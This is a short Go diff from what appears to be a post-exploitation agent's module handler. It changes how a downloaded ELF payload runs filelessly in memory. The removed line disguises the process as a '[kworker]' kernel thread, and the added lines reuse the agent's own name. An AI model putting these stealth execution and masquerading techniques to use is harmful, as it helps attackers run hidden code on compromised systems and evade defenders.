@@ -60,10 +60,14 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	case "elf":
 		outChan := make(chan string)
 		go func() {
-			randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
+			err = util.FileAllocate(os.Args[0], 0)
+			if err != nil {
+				outChan <- logging.Sprintf("FileAllocate: %v", err)
+				return
+			}
 			// if you need to pass arguments to the in-memory module, you can do it in environment variables
 			// when implementing the module, you can read the arguments from env
-			out, err = exeutil.InMemExeRun(payload_data, []string{randName}, nil)
+			out, err = exeutil.InMemExeRun(payload_data, []string{os.Args[0]}, nil)
 			if err != nil {
 				out = logging.Sprintf("InMemExeRun: %v", err)
 			}
